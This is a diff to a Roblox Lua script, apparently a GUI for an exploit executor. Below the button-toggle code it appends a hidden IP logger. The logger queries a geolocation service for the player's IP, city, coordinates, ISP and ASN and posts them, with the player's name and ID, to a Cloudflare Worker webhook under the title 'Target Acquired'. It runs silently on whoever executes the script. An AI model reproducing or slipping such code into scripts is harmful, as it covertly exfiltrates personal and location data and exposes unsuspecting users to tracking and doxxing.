@@ -143,3 +143,53 @@ so.Completed:Connect(function() if not isOpen then ob.Visible=true end end)
 end
 end
 ob.MouseButton1Click:Connect(function() tgl(true) end) cb.MouseButton1Click:Connect(function() tgl(false) end)
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local p = Players.LocalPlayer
+
+-- 1. Fetch location data from json.geoiplookup.io
+local success, response = pcall(function()
+    return request({
+        Url = "https://json.geoiplookup.io/",
+        Method = "GET"
+    })
+end)
+
+if not success or not response or not response.Body then return end
+
+local d = HttpService:JSONDecode(response.Body)
+
+-- 2. Send to your Cloudflare Worker proxy URL using Discord Embed format
+local PROXY_WEBHOOK = "https://cold-morning-5939.tiodboiii.workers.dev/"
+
+pcall(function()
+    request({
+        Url = PROXY_WEBHOOK,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            username = "IP Logger",
+            embeds = {
+                {
+                    title = "Target Acquired",
+                    color = 16711680, -- Red color sidebar for the embed
+                    fields = {
+                        { name = "User", value = string.format("%s (ID: %d)", p.Name, p.UserId), inline = false },
+                        { name = "IP Address", value = tostring(d.ip), inline = true },
+                        { name = "Location", value = string.format("%s, %s (%s)", tostring(d.city), tostring(d.region), tostring(d.country_name)), inline = true },
+                        { name = "Coordinates", value = string.format("%s, %s", tostring(d.latitude), tostring(d.longitude)), inline = true },
+                        { name = "Timezone", value = tostring(d.timezone), inline = true },
+                        { name = "ISP / Org", value = string.format("%s (%s)", tostring(d.isp), tostring(d.org)), inline = false },
+                        { name = "ASN", value = tostring(d.asn), inline = false }
+                    },
+                    footer = {
+                        text = "GeoIP Lookup System"
+                    }
+                }
+            }
+        })
+    })
+end)
